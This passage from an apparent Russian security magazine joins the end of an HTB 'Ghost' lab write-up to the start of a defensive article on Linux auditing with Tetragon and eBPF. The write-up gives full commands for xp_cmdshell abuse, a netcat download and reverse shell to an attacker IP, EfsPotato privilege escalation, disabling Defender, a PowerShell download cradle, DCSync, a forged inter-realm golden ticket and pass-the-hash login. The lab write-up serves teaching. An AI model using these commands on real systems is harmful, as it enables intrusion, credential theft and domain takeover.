principal_id WHERE a.permission_name = ''IMPERSONATE'';') AT
"PRIMARY";





               Настройки олицетворения на связанном сервере

Учетная  запись sa  имеет  привилегии  для  конфигурирования  сервера
и  выполнения  команд  в  операционной  системе  через   процедуру
xp_cmdshell. Выполним две команды: загрузку netcat и запуск реверс‑шел‐
ла.


EXECUTE('EXECUTE AS LOGIN = ''sa''; EXEC SP_CONFIGURE ''show
advanced options'', 1; reconfigure; EXEC SP_CONFIGURE ''xp_cmdshell''
, 1; reconfigure; exec xp_cmdshell ''curl 10.10.16.8:8000/nc64.exe
-o C:\Windows\Tasks\nc.exe'';') AT "PRIMARY"


EXECUTE('EXECUTE AS LOGIN = ''sa''; EXEC SP_CONFIGURE ''show
advanced options'', 1; reconfigure; EXEC SP_CONFIGURE ''xp_cmdshell''
, 1; reconfigure; exec xp_cmdshell ''cmd /c C:\Windows\Tasks\nc.exe
10.10.16.8 4321 -e cmd.exe'';') AT "PRIMARY"

В листенер прилетает сессия от имени учетной записи службы базы данных.





                       Информация о пользователе


Локальное повышение привилегий
У пользователя активна привилегия SeImpersonatePrivilege (право «Оли‐
цетворять клиента после проверки подлинности»). Документация гласит сле‐
дующее:

      Присвоение пользователю права «Олицетворять клиента после про-
       верки подлинности» разрешает программам, запущенным от имени«
       данного пользователя, олицетворять клиента. Использование данного
      параметра  предотвращает олицетворение неавторизованными сер-
      верами клиентов, подключающихся к этим серверам с помощью про-
      цедур RPC или именованных каналов.                »
Другими словами, эта привилегия позволяет имитировать любой токен, дес‐
криптор которого мы сможем получить, чаще всего это SYSTEM. Это явный
вектор для повышения привилегий!
   Обычно в таких случаях используется одна из Potato-программ, однако
антивирус прибивает любой загруженный исполняемый файл. Чтобы обойти
это, с помощью .NET Framework скомпилируем EfsPotato.cs прямо на уда‐
ленном  сервере. Но для  начала  проверим  версии  компонентов .NET
Framework в каталоге C:\Windows\Microsoft.Net\Framework.





         Содержимое каталога C:\Windows\Microsoft.Net\Framework

Воспользуемся версией v4.0.30319 и соберем исполняемый файл.


C:\Windows\Microsoft.Net\Framework\v4.0.30319\csc.exe ep.cs -nowarn:
1691,618





                       Сборка исполняемого файла

Когда все готово, запускаем листенер (rlwrap nc -nlvp 5432) и через
EfsPotato выполняем реверс‑шелл.


.\ep.exe "C:\Windows\Tasks\ep.exe 10.10.16.8 5432 -e cmd.exe"





                              Эксплуатация EfsPotato

В окне листенера получаем сессию от имени SYSTEM.





                             Сессия SYSTEM




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
          HTB GHOST
        ПРОБИРАЕМСЯ ЧЕРЕЗ ЛЕС ACTIVE
                           DIRECTORY





КОРНЕВОЙ ДОМЕН

Первым делом отключим антивирус, чтобы он нам не мешал.


Set-MpPreference -DisableRealtimeMonitoring $True





                           Отключение антивируса

Теперь со  своего веб‑сервера  загрузим  PowerShell-скрипт PowerView
и просмотрим информацию о текущем домене, а  также существующие
доверительные отношения.


IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.8:
8000/PowerView4.ps1')


Get-Domain
Get-DomainTrust





                         Информация о домене





                      Доверительные отношения домена

В лесу два домена, и мы скомпрометировали дочерний. Имея доступ к кон‐
троллеру дочернего домена, можно скомпрометировать и родительский.
Для этого необходимо получить ключ доверия между доменами. Для домена
corp.ghost.htb это ключ Kerberos учетной записи GHOST$. Получить его
можно с помощью DCSync.


mimikatz "lsadump::dcsync /domain:corp.ghost.htb /user:GHOST$" "exit"





                          Учетные данные GHOST$

В выводе есть и SID текущего домена, нам остается узнать SID трастового
домена.





            Информация об учетной записи трастового домена

Теперь с помощью ticketer.py создадим междоменный золотой билет
для несуществующего пользователя fake_admin. При этом в билете будет
добавлен SID группы «Администраторы предприятия».


ticketer.py -nthash 8336b1a09e8c242d272d3762b95c0e5e -domain-sid S-1-
5-21-2034262909-2733679486-179904498 -extra-sid S-1-5-21-4084500788-
938703357-3654145966-519 -spn krbtgt/GHOST.HTB -domain corp.GHOST.
HTB fake_admin





                       Создание золотого билета

С созданным билетом TGT получаем TGS для службы CIFS на контроллере
родительского домена.


KRB5CCNAME=fake_admin.ccache getST.py -k -no-pass -spn CIFS/DC01.
GHOST.HTB GHOST.HTB/fake_admin@GHOST.HTB




                            Получение TGS-билета

Так как в скриптах impacket атака AnySPN, которая заключается в замене
SPN внутри билета, производится автоматически, сдампим учетные данные
пользователя Administrator с контроллера родительского домена с получен‐
ным ранее билетом.


KRB5CCNAME=fake_admin@GHOST.HTB@CIFS_DC01.GHOST.HTB@GHOST.HTB.ccache
secretsdump.py -k -no-pass fake_admin@DC01.GHOST.HTB -just-dc-user
'ghost/Administrator'





                     Дамп учетных данных

Осталось подключиться к DC01 по WinRM и забрать последний флаг.


evil-winrm -u 'Administrator' -H 1cdb17d5c14ff69e7067cffcc9e470bd -i
10.10.11.24




                           Флаг рута

Машина захвачена!
АДМИН





          Борис Осепов
            Специалист ИБ. Увлекаюсь средствами анализа вредоносного ПО.
          Люблю проверять маркетинговые заявления на практике :)


          Александр Мессерле
            ИБтивист. Исследую в ИБ то, что движется.
              То, что не движется, кладу в песочницу.

На дворе весна, хочется чего‑то легкого, свежего и нового.
Вот, например, свежая идея: нельзя ли вести логи в Linux,
не прописывая для auditd сто тысяч раз пути к критичным
конфигам  и  исполняемым  файлам?  Рядом  девопсеры
обсуждали Cilium и какой‑то Tetragon, который может писать
логи в JSON. Мы решили тоже попробовать!


Tetragon основан на eBPF — это технология, встроенная в ядро Linux, которая
позволяет  безопасно и  эффективно  запускать мини‑программы  прямо
в ядре. Благодаря этому eBPF-инструменты, как правило, быстрее и пот‐
ребляют меньше ресурсов, чем классические решения вроде закостенелого
auditd.
   Тот, кто хотя бы раз настраивал auditd для SOC, наверняка сталкивался
с самыми разными, в том числе безумными, конфигурациями — например,
очень популярный конфиг от Neo23x0 насчитывает более 800 строк. Попытки
преодолеть  ограничения и адаптироваться под  конкретный  дистрибутив
и архитектуру — та еще морока.


             INFO

                           Сразу оговоримся, что Falco и иные инструменты
                      и подходы мы не рассматриваем, — это тема
                          отдельной статьи.


Tetragon универсален и работает на множестве платформ, написан на Go,
а еще «из коробки» приспособлен к работе с контейнерами. Но информации
по нему (а особенно тому, как использовать его эффективно) крайне мало.
   Давай вместе разбираться, как можно играться с Tetragon. Бонусом в кон‐
це статьи — реальная история о том, почему Tetragon местами лютый вин.


                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ
АУДИТ ПО-ВЗРОСЛОМУ
              ПРИМЕНЯЕМ TETRAGON
           НА ПРАКТИКЕ (И УБЕЖДАЕМСЯ
                      В СИЛЕ EBPF)





ОСНОВНЫЕ ПОНЯТИЯ И СХЕМА РАБОТЫ

Начать придется с теории, но мы обойдемся без душных деталей. Итак, внут‐
ри у Tetragon технология eBPF. Изначально она была разработана для Linux,
но, кстати, и в Microsoft сейчас тоже пилят свою реализацию.
   Ядро Linux — это программный слой между приложениями и оборудо‐
ванием, на котором они работают. Приложения живут в непривилегирован‐
ном слое, называемом пользовательским пространством, оно не может
получить доступ к оборудованию напрямую. Вместо этого приложение делает
запросы, используя интерфейс системных вызовов, так называемые syscall,
чтобы попросить ядро действовать от его имени.
   Этот доступ к оборудованию может включать чтение и запись в файлы,
отправку и получение сетевого трафика или даже просто доступ к памяти.
Ядро также отвечает за координацию параллельных процессов, позволяя
многим приложениям работать одновременно.





                    Примерная схема работы ядра Linux

eBPF, или Extended Berkeley Packet Filter, — фреймворк, позволяющий поль‐
зователям загружать и запускать программы в ядре операционной системы.
  А еще BPF — это виртуальная машина внутри Linux, которая выполняет код
BPF  в режиме  ядра.  После  загрузки  программа eBPF  прикрепляется
к целевой функции ядра, чтобы наш код запускался всякий раз, когда про‐
исходит ее вызов. Считай, что это некая прослойка‑надзиратель.
   Так как это все работает на привилегированном уровне, нужна серьезная
безопасность. Поэтому механизм eBPF включает верификатор, который
гарантирует, что программа eBPF загружается только в том случае, если ее
запуск безопасен. Детали можно посмотреть в документации.
   Есть готовые библиотеки для написания своей утилиты с применением
eBPF, но лишь на небольшом числе языков. Среди них — C, Go, Rust и Python.
Выбор языка усложняется еще и тем, что не для всех языков есть либы,
реализующие  поддержку  libbpf  (популярный  вариант  для  обеспечения
переносимости программ eBPF между разными версиями ядра). Но мы
с тобой не кодеры и будем использовать готовое решение, разработчики
которого уже обо всем позаботились.





                    Схема работы приложения Tetragon

Давай разберем основные функциональные компоненты системы.
   Политики трассировки (tracing policy) — это для нас основной инструмент
работы. Они позволяют настраивать как реакции для мониторинга (логиро‐
вания), так и активные действия (блокирование доступа, убийство процесса
и прочее) на основе заданных критериев. Политики задаются в файлах YAML
и складируются в каталог /etc/tetragon/tetragon.tp.d/. В качестве кри‐
териев могут выступать названия сисколов, вызовы функций ядра, значения
вызываемых  аргументов.  Можно  добавлять  кастомный  текст,  который
добавится в алерт.
   Чтобы составить собственную политику аудита, надо разбираться в прин‐
ципах работы ядра Linux. Ключевые сущности, на которые можно навесить
генерацию событий (или выполнение иных действий), следующие:
 • LSM  (Linux  Security  Modules) BPF, они же  хуки  безопасности
   SELinux/AppArmor. Для их использования необходимо выполнение ряда
   условий — модули должны быть загружены, включены и прочее. Названия
   функций можно взять из исходников Linux. Из преимуществ —  воз‐
   можность рассчитывать хеши для файлов и обогащать ими генерируемые
   события. Обычно в компаниях, где используются политики безопасности,
   с харденингом и так все неплохо, поэтому движемся дальше.
 • Kprobes (Kernel probes), или зонды ядра. По сути, дают возможность соз‐
   дания брейк‑пойнта перед вызовом инструкции ядра с выполнением про‐
   извольного  кода.  Например,  можно заменить  аргументы —  кстати,
   не только входные. Но kprobes могут меняться между версиями ядра опе‐
   рационки, что сделает наши политики нестабильными. Чтобы вывести спи‐
   сок доступных kprobes, выполни в терминале cat  /proc/kallsyms.
  В политиках Tetragon для системных вызовов  (syscall) рекомендуется
   использовать обобщенное название вызова, например вместо значений
  do_sys_open, __x64_sys_open или __ia32_sys_open в политике мож‐
   но указывать просто sys_open. Tetragon умный, сам разберется и адап‐
   тируется под архитектуру, на которой работает.
 • Uprobes. В целом аналогичны kprobes, только применяются к прог‐
  раммам в пространстве пользователя. Здесь работу с uprobes мы рас‐
   сматривать не будем, поскольку хуки ядра и так дают нам достаточно воз‐
   можностей для тонкой настройки политик.
 • Tracepoints . Точки трассировки статически прописаны в ядре. Именно
   они считаются наиболее удачным вариантом для отслеживания и прик‐
   репления своего кода для отладки. Основное преимущество перед зон‐
  дами — стабильность между релизами.

Чтобы узнать доступные трейспойнты в своей системе, выполни такую коман‐
ду:


cat /sys/kernel/debug/tracing/available_events

Вывод будет в формате «категория:имя»; последнее — как раз то, за что
может уцепиться eBPF.
  В некоторых системах ряд точек недоступен, проверить их список можно
так:


cat /sys/kernel/debug/krpobes/blacklist

Из минусов трейспойнтов — они есть далеко не для всех функций ядра, и,
если нужного нет, придется смотреть в сторону kprobes.
  К чему в итоге лучше хукаться и как посмотреть все позиции данного
меню? При  выборе  между  названием  syscall,  функции  ядра,  kprobe
и tracepoint предпочтительнее ориентироваться на трейспойнты, поскольку
они имеют более стабильный интерфейс, чем элементы ядра. Функции ядра
могут периодически меняться, что в долгосрочной перспективе может при‐
вести к проблемам. Если совсем лень разбираться, можно просто грепать
в выводе утилиты bpftrace: bpftrace -l — она покажет просто всё, за что
можно зацепиться.
  Мы в статье будем использовать микс на основе отдельных сисколов
и функций ядра. Это обеспечит плавный переход от auditd (который срав‐
нительно известен) к применению eBPF на основе kprobes и tracepoints.


Шпаргалка по хукам
Чтобы упростить себе и коллегам жизнь, мы составили таблицу по самым
популярным или интересным активностям, которые обычно хотят видеть
безопасники. В таблице мы свели имена отдельных сисколов, как их привык‐
ли записывать в правилах auditd. Рядом указываем названия функций ядра,
сопоставляемых с данными сисколов, — это уже можно пытаться исполь‐
зовать в eBPF-решениях, в том числе в Tetragon.
  В качестве бонуса приводим некоторые kprobes и ближайшие tracepoints.
Ты можешь приаттачиться почти к любой функции ядра — просто глянь,
сколько их (в системе должен быть зарегистрирован kprobe):


cat /sys/kernel/debug/krpobes/list





За деталями о том, за что отвечает каждый сискол, рекомендуем обратиться
к таблице. За названиями функций, вызывающими эти сисколы, тебе сюда —
на примере архитектуры х64, есть неплохая сводка из проекта Tracee.
   Как думаешь, как часто программы вызывают код ядра? Узнать это можно
при помощи утилиты strace. Чтобы вывести системные вызовы (трассировку),
которые делает приложение, напиши


strace ps

Чтобы просто посмотреть статистику по системным вызовам, можно исполь‐
зовать следующий сниппет:


for f in "cat /etc/passwd" ; do
     strace -c $f 2>&1 > /dev/null |
         grep -v ':' | cut --complement -c 42-50 |
         sed '1s/^% /%_/;2d' | head -n -2 ;
done | sed -n '1p;/^%/d;p' | datamash -HW -sg5 sum 4  |
       xargs printf "%-12s\t%14s\n"

Вывод:



  GroupBy(syscall)            sum(calls)
  access                       1
  arch_prctl                   1
  brk                          3
  close                       20
  execve                       1
  fadvise64                    1
  fstat                       19
  futex                        1
  getrandom                    1
  mmap                        22
  mprotect                     3
  munmap                       2
  openat                      31
  pread64                      2
  prlimit64                    1
  read                         5
  rseq                         1
  set_robust_list              1
  set_tid_address              1
  write                        1


Важно понимать, что для ускорения работы разработчики Tetragon сделали
несколько адаптаций для kprobes, которые можно посмотреть в исходном
коде. Например, security_file_permission, который агрегирует в себе
сразу несколько системных вызовов, поскольку эта функция ядра проверяет
права на файл перед непосредственным обращением к нему.


        WWW

                        Подробнее  об  изменениях  можно  прочитать
                        в разделе документации Use Cases.


Что приятно, Tetragon сам адаптируется под архитектуру, на которой запущен.
Для auditd приходилось писать длинные пассажи о том, какие сисколы нужно
вызывать при работе на разных архитектурах. Здесь же можно просто задать
политики трассировки и указать sys_ptrace, какой вызов будет зарезолвлен
в  одну  из   функций  ядра    (__x64_sys_ptrace/__ia32_sys_ptrace/
__ia32_compat_sys_ptrace или __x64_compat_sys_ptrace). За это отве‐
чает параметр syscall в селекторе. Обычно он выставлен false, то есть
отслеживаются обращения к функциям ядра. Если поставить true, будут ана‐
лизироваться все сисколы (даже те, что не дойдут до выполнения функции
ядра).
   Встроенные в политику трассировки для отслеживания запуска и завер‐
шения процессов используют, например, sys_execve, отмеченный в таблице
выше, — он соотносится с tracepoint sched_process_exec; со стороны LSM
это kprobe security_bprm_committing_creds, завершение детектится через
kprobe  acct_process,  а  создание  форка  процесса —  через  kprobe
wake_up_new_task.


Селекторы
Продолжим про политики. Мы вроде определились, что есть основные сис‐
темные хуки, от которых можно плясать. А как же нам нафильтровывать мякот‐
ку?
  В каждой политике можно указать до пяти селекторов, применяемых к каж‐
дому ивенту. Селекторы, как очевидно из названия, позволяют фильтровать
только интересные нам события. Доступны следующие виды селекторов:
 • matchArgs — по значению аргументов;
 • matchReturnArgs — по возвращаемым значениям;
 • matchPIDs — по PID процесса;
 • matchBinaries — по пути к исполняемому файлу;
 • matchNamespaces — по пространствам имен (namespaces);
 • matchCapabilities — по Linux capabilities (привилегиям);
 • matchNamespaceChanges — по изменениям в пространстве имен;
 • matchCapabilityChanges — по изменениям capabilities;
 • matchActions — применить действие;
 • matchReturnActions — применить действие к выходным событиям
   из селектора.

Обрати внимание, что, к сожалению, в значениях для работы селекторов нет
возможности указывать вайлдкарту (звездочку). В ряде случаев SOC интерес‐
но  отслеживать  изменения  в  таких  файлах,  как  /home/<username>/.
bash_history, что как раз было бы удобно делать по маске. Тут в качестве
альтернативы можно юзать операторы Prefix и Postfix в селекторах.
  В целом селекторы довольно несложная штука. Интересно понимать,
какие действия (помимо логирования) можно делать в политике (мы при‐
водим здесь не все):
 • убить процесс;
 • послать сигнал процессу;
 • изменить вывод процесса;
 • триггернуть URL;
 • сделать DNS-резолв.

Последние два действия задумывались в том числе как способ оповещения
наподобие Canarytokens, но никто тебе не мешает повесить и проактивную
защиту от EDR... Если хочется посмотреть все возможные действия, то заг‐
ляни в документацию.
  В селекторах доступны следующие операторы, помимо привычных «рав‐
но», «не равно», «больше» и «меньше». Это указание порта или адреса
источника и назначения — со сразу заложенной возможностью определения
привилегированных портов. Иронично, но также для этих параметров есть
и операторы вида «не порт назначения», «не системный порт» и так далее.
Это, вообще говоря, очень полезные функции, только странно, что не завезли
просто отдельного оператора «не». Есть оператор проверки битовой маски,
сетевого протокола, семейства IP-адреса и состояния TCP-соединения (что
может быть полезно при выявлении различных сканирований). Полный спи‐
сок — опять же в документации.
  По основам бегло пробежались (мы старались быть лаконичными), прис‐
тупаем к практическим упражнениям.


                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ
АУДИТ ПО-ВЗРОСЛОМУ
              ПРИМЕНЯЕМ TETRAGON
           НА ПРАКТИКЕ (И УБЕЖДАЕМСЯ
                      В СИЛЕ EBPF)





УСТАНОВКА И НАСТРОЙКА

Ставить будем в Linux. Смотрим номер последнего релиза на GitHub, перехо‐
дим в браузере. На момент написания статьи актуальная версия — v1.3.0.
Скачиваем и устанавливаем ее:


# Скачиваем архив
curl -LO https://github.com/cilium/tetragon/releases/download/v1.3.0/
tetragon-v1.3.0-amd64.tar.gz


# Распаковываем в папку tetragon-v1.3.0-amd64
tar -xvf tetragon-v1.3.0-amd64.tar.gz


# Переходим в нее
cd tetragon-v1.3.0-amd64/


# Запускаем установку
sudo ./install.sh

Получив заветное Tetragon installed successfully!, убедимся, что он запущен
и активен: sudo systemctl status tetragon.


        WWW

                         •Официальная инструкция по установке
                        •Описание конфига по умолчанию
                       •Примеры настроек



Основные локации Tetragon
После установки дальнейшая настройка параметров Tetragon проводится
в директории /etc/tetragon/tetragon.conf.d/.
   Отдельные  параметры  можно  настраивать,  просто  создавая  файлы:
называешь файл так же, как параметр, а внутри сохраняешь значение.
  В первую очередь, раз мы собираемся заниматься логированием, укажем
путь к файлу, куда писать лог. Папка логов — /var/log/tetragon/:


echo "/var/log/tetragon/tetragon.log" > /etc/tetragon/tetragon.conf.
d/export-file
systemctl restart tetragon

В таблице — дефолтные настройки по логам (держим не более пяти файлов
размером не более 10 Мбайт):
 • --export-file-max-backups — количество ротируемых JSON-фай‐
   лов — 5;
 • --export-file-max-size-mb — размер файлов в мегабайтах — 10.

Чтобы не забить логами диск, регулируй значения выше в конфиге.
   Заглянем в лог, чтобы познакомиться с ним:


less /var/log/tetragon/tetragon.log

Если ты морально не готов отказаться от syscall-событий auditd, где лампово
указываются пользовательские и групповые ID (UID, GID, EUID, SUID и про‐
чие), ты всегда можешь их добавить к событиям Tetragon.
   Сравни обогащенное событие auditd и Tetragon о запуске ps. Вот версия
auditd:


type=SYSCALL msg=audit(1663937111.702:73702361): arch=c000003e
syscall=59 success=yes exit=0 a0=7f90824cfbf8 a1=7f907a020608
a2=7f907d9de920 a3=7f90742fcb10 items=2 ppid=1736 pid=3202324
auid=4294967295 uid=996 gid=997 euid=996 suid=996 fsuid=996 egid=997
sgid=997 fsgid=997 tty=(none) ses=4294967295 comm="ps" exe="/usr/bin/
ps" key="execve_example" ARCH=x86_64 SYSCALL=execve AUID="unset"
UID="git" GID="git" EUID="git" SUID="git" FSUID="git" EGID="git"
SGID="git" FSGID="git"

А вот Tetragon с дефолтной политикой трассировки:


{
  "process_exec": {
    "process": {
      "exec_id": "UEFETUlOOjIwNzk2MzM1MzM0MTA4OjI2NDM4",
      "pid": 26438,
      "uid": 0,
      "cwd": "/root",
      "binary": "/usr/bin/ps",
      "flags": "execve clone",
      "start_time": "2025-03-15T09:16:44.617411202Z",
      "auid": 4294967295,
      "parent_exec_id": "UEFETUlOOjE1NzI2NzE4NDk4MzUyOjIxNzA0",
      "tid": 26438,
      "in_init_tree": false
    },
    "parent": {
      "exec_id": "UEFETUlOOjE1NzI2NzE4NDk4MzUyOjIxNzA0",
      "pid": 21704,
      "uid": 0,
      "cwd": "/root",
      "binary": "/bin/bash",
      "flags": "execve clone",
      "start_time": "2025-03-13T18:06:21.898754560Z",
      "auid": 4294967295,
      "parent_exec_id": "UEFETUlOOjE1NzI2NzA5NjQ4MzE2OjIxNzAy",
      "tid": 21704,
      "in_init_tree": false
    }
  },
  "node_name": "PADMIN",
  "time": "2025-03-15T09:16:44.617410306Z"
}
{
  "process_exit": {
    "process": {
      "exec_id": "UEFETUlOOjIwNzk2MzM1MzM0MTA4OjI2NDM4",
      "pid": 26438,
      "uid": 0,
      "cwd": "/root",
      "binary": "/usr/bin/ps",
      "flags": "execve clone",
      "start_time": "2025-03-15T09:16:44.617411202Z",
      "auid": 4294967295,
      "parent_exec_id": "UEFETUlOOjE1NzI2NzE4NDk4MzUyOjIxNzA0",
      "tid": 26438,
      "in_init_tree": false
    },
    "parent": {
      "exec_id": "UEFETUlOOjE1NzI2NzE4NDk4MzUyOjIxNzA0",
      "pid": 21704,
      "uid": 0,
      "cwd": "/root",
      "binary": "/bin/bash",
      "flags": "execve clone",
      "start_time": "2025-03-13T18:06:21.898754560Z",
      "auid": 4294967295,
      "parent_exec_id": "UEFETUlOOjE1NzI2NzA5NjQ4MzE2OjIxNzAy",
      "tid": 21704,
      "in_init_tree": false
    },
    "time": "2025-03-15T09:16:44.636431137Z"
  },
  "node_name": "PADMIN",
  "time": "2025-03-15T09:16:44.636429903Z"
}


             INFO

                            Логи Tetragon удобно смотреть командой tetra
                   getevents.


Теперь добавим обогащение capabilities:


echo "true" > /etc/tetragon/tetragon.conf.d/enable-process-cred
systemctl restart tetragon
ps
tail -f /var/log/tetragon/tetragon.log

Вывод довольно громоздкий, на любителя:


{
  "process_exec": {
    "process": {
      "exec_id": "UEFETUlOOjIxMDA3MzE3NjA4MjU5OjI2NjU2",
      "pid": 26656,
      "uid": 0,
      "cwd": "/root",
      "binary": "/usr/bin/ps",
      "flags": "execve",
      "start_time": "2025-03-15T09:20:15.599685868Z",
      "auid": 4294967295,
      "parent_exec_id": "UEFETUlOOjA6MjE3MDQ=",
      "cap": {
        "permitted": [
            "CAP_CHOWN", "DAC_OVERRIDE", "CAP_DAC_READ_SEARCH",
"CAP_FOWNER", "CAP_FSETID", "CAP_KILL", "CAP_SETGID", "CAP_SETUID",
"CAP_SETPCAP", "CAP_LINUX_IMMUTABLE", "CAP_NET_BIND_SERVICE",
"CAP_NET_BROADCAST", "CAP_NET_ADMIN", "CAP_NET_RAW", "CAP_IPC_LOCK",
"CAP_IPC_OWNER", "CAP_SYS_MODULE", "CAP_SYS_RAWIO", "CAP_SYS_CHROOT",
 "CAP_SYS_PTRACE", "CAP_SYS_PACCT", "CAP_SYS_ADMIN", "CAP_SYS_BOOT",
"CAP_SYS_NICE", "CAP_SYS_RESOURCE", "CAP_SYS_TIME",
"CAP_SYS_TTY_CONFIG", "CAP_MKNOD", "CAP_LEASE", "CAP_AUDIT_WRITE",
"CAP_AUDIT_CONTROL", "CAP_SETFCAP", "CAP_MAC_OVERRIDE",
"CAP_MAC_ADMIN", "CAP_SYSLOG", "CAP_WAKE_ALARM", "CAP_BLOCK_SUSPEND",
 "CAP_AUDIT_READ", "CAP_PERFMON", "CAP_BPF", "CAP_CHECKPOINT_RESTORE"
        ],
        "effective": [
            "CAP_CHOWN", "DAC_OVERRIDE", "CAP_DAC_READ_SEARCH",
"CAP_FOWNER", "CAP_FSETID", "CAP_KILL", "CAP_SETGID", "CAP_SETUID",
"CAP_SETPCAP", "CAP_LINUX_IMMUTABLE", "CAP_NET_BIND_SERVICE",
"CAP_NET_BROADCAST", "CAP_NET_ADMIN", "CAP_NET_RAW", "CAP_IPC_LOCK",
"CAP_IPC_OWNER", "CAP_SYS_MODULE", "CAP_SYS_RAWIO", "CAP_SYS_CHROOT",
 "CAP_SYS_PTRACE", "CAP_SYS_PACCT", "CAP_SYS_ADMIN", "CAP_SYS_BOOT",
"CAP_SYS_NICE", "CAP_SYS_RESOURCE", "CAP_SYS_TIME",
"CAP_SYS_TTY_CONFIG", "CAP_MKNOD", "CAP_LEASE", "CAP_AUDIT_WRITE",
"CAP_AUDIT_CONTROL", "CAP_SETFCAP", "CAP_MAC_OVERRIDE",
"CAP_MAC_ADMIN", "CAP_SYSLOG", "CAP_WAKE_ALARM", "CAP_BLOCK_SUSPEND",
 "CAP_AUDIT_READ", "CAP_PERFMON", "CAP_BPF", "CAP_CHECKPOINT_RESTORE"
        ]
      },
      "tid": 26656,
      "process_credentials": {
        "uid": 0,
        "gid": 0,
        "euid": 0,
        "egid": 0,
        "suid": 0,
        "sgid": 0,
        "fsuid": 0,
        "fsgid": 0
      },
      "in_init_tree": false
    }
  },
  "node_name": "PADMIN",
  "time": "2025-03-15T09:20:15.599686113Z"
}


Особенности для контейнеров
В Tetragon не нужны какие‑то особые действия для ловли событий внутри кон‐
тейнеров, подов и так далее.
   Ниже — пример лога после запуска команды whoami внутри контейнера
Docker:


{"process_exec":{"process":{"exec_id":
"eGFrZXA6MjE0MjM0Nzk1NTg5MTgwNDI6MzYzNTE0NA==", "pid":3635144, "uid":
0, "cwd":"/", "binary":"/usr/bin/whoami", "flags":"execve rootcwd
clone inInitTree", "start_time":
"2025-03-10T08:22:46.921009521Z", "auid":4294967295, "docker":
"d7a3f91a19404549b4422f5cdd4975a", "parent_exec_id":
"eGFrZXA6MjE0MjM0MTQ4NzIzMzkzNjg6MzYzMTUyMQ==", "tid":3635144,
"in_init_tree":true}, "paren
t":{"exec_id":"eGFrZXA6MjE0MjM0MTQ4NzIzMzkzNjg6MzYzMTUyMQ==", "pid":
3631521, "uid":0, "cwd":"/", "binary":"/bin/bash", "flags":"execve
rootcwd clone inInitTree", "start_time":"2025-03-10T08:21:42.
234432165
Z", "auid":4294967295, "docker":"d7a3f91a19404549b4422f5cdd4975a",
"parent_exec_id":"eGFrZXA6MjE0MjM0MTQ1NDk0ODU4NDg6MzYzMTUw", "tid":
3631521, "in_init_tree":true}}, "node_name":"fi", "time":"2025-03-1
0T08:22:46.921008920Z"}


{"process_kprobe":{"process":{"exec_id":
"eGFrZXA6MjE0MjM0Nzk1NTg5MTgwNDI6MzYzNTE0NA==", "pid":3635144, "uid":
0, "cwd":"/", "binary":"/usr/bin/whoami", "flags":"execve rootcwd
clone inInitTree", "start_time
":"2025-03-10T08:22:46.921009521Z", "auid":4294967295, "docker":
"d7a3f91a19404549b4422f5cdd4975a", "parent_exec_id":
"eGFrZXA6MjE0MjM0MTQ4NzIzMzkzNjg6MzYzMTUyMQ==", "refcnt":1, "tid":
3635144, "in_init_tree"
:true}, "parent":{"exec_id":
"eGFrZXA6MjE0MjM0MTQ4NzIzMzkzNjg6MzYzMTUyMQ==", "pid":3631521, "uid":
0, "cwd":"/", "binary":"/bin/bash", "flags":"execve rootcwd clone
inInitTree", "start_time":"2025-03-10T08:2
1:42.234432165Z", "auid":4294967295, "docker":
"d7a3f91a19404549b4422f5cdd4975a", "parent_exec_id":
"eGFrZXA6MjE0MjM0MTQ1NDk0ODU4NDg6MzYzMTUw", "tid":3631521,
"in_init_tree":true}, "function_name":"secur
ity_file_permission", "args":[{"file_arg":{"path":"/etc/passwd",
"permission":"-rw-r--r--"}}, {"int_arg":4}], "return":{"int_arg":0},
"action":"KPROBE_ACTION_POST", "policy_name":"file-change-read-moni
toring-filtered-fullpath", "return_action":"KPROBE_ACTION_POST"},
"node_name":"fi", "time":"2025-03-10T08:22:46.922387741Z"}


{"process_kprobe":{"process":{"exec_id":
"eGFrZXA6MjE0MjM0Nzk1NTg5MTgwNDI6MzYzNTE0NA==", "pid":3635144, "uid":
0, "cwd":"/", "binary":"/usr/bin/whoami", "flags":"execve rootcwd
clone inInitTree", "start_time
":"2025-03-10T08:22:46.921009521Z", "auid":4294967295, "docker":
"d7a3f91a19404549b4422f5cdd4975a", "parent_exec_id":
"eGFrZXA6MjE0MjM0MTQ4NzIzMzkzNjg6MzYzMTUyMQ==", "refcnt":1, "tid":
3635144, "in_init_tree"
:true}, "parent":{"exec_id":
"eGFrZXA6MjE0MjM0MTQ4NzIzMzkzNjg6MzYzMTUyMQ==", "pid":3631521, "uid":
0, "cwd":"/", "binary":"/bin/bash", "flags":"execve rootcwd clone
inInitTree", "start_time":"2025-03-10T08:2
1:42.234432165Z", "auid":4294967295, "docker":
"d7a3f91a19404549b4422f5cdd4975a", "parent_exec_id":
"eGFrZXA6MjE0MjM0MTQ1NDk0ODU4NDg6MzYzMTUw", "tid":3631521,
"in_init_tree":true}, "function_name":"secur
ity_file_permission", "args":[{"file_arg":{"path":"/etc/passwd",
"permission":"-rw-r--r--"}}, {"int_arg":4}], "return":{"int_arg":0},
"action":"KPROBE_ACTION_POST", "policy_name":"file-change-read-moni
toring-filtered-fullpath", "return_action":"KPROBE_ACTION_POST"},
"node_name":"fi", "time":"2025-03-10T08:22:46.922425253Z"}


{"process_exit":{"process":{"exec_id":
"eGFrZXA6MjE0MjM0Nzk1NTg5MTgwNDI6MzYzNTE0NA==", "pid":3635144, "uid":
0, "cwd":"/", "binary":"/usr/bin/whoami", "flags":"execve rootcwd
clone inInitTree", "start_time":
"2025-03-10T08:22:46.921009521Z", "auid":4294967295, "docker":
"d7a3f91a19404549b4422f5cdd4975a", "parent_exec_id":
"eGFrZXA6MjE0MjM0MTQ4NzIzMzkzNjg6MzYzMTUyMQ==", "tid":3635144,
"in_init_tree":true}, "paren
t":{"exec_id":"eGFrZXA6MjE0MjM0MTQ4NzIzMzkzNjg6MzYzMTUyMQ==", "pid":
3631521, "uid":0, "cwd":"/", "binary":"/bin/bash", "flags":"execve
rootcwd clone inInitTree", "start_time":"2025-03-10T08:21:42.
234432165
Z", "auid":4294967295, "docker":"d7a3f91a19404549b4422f5cdd4975a",
"parent_exec_id":"eGFrZXA6MjE0MjM0MTQ1NDk0ODU4NDg6MzYzMTUw", "tid":
3631521, "in_init_tree":true}, "time":"2025-03-10T08:22:46.92268996
1Z"}, "node_name":"fi", "time":"2025-03-10T08:22:46.922688945Z"}

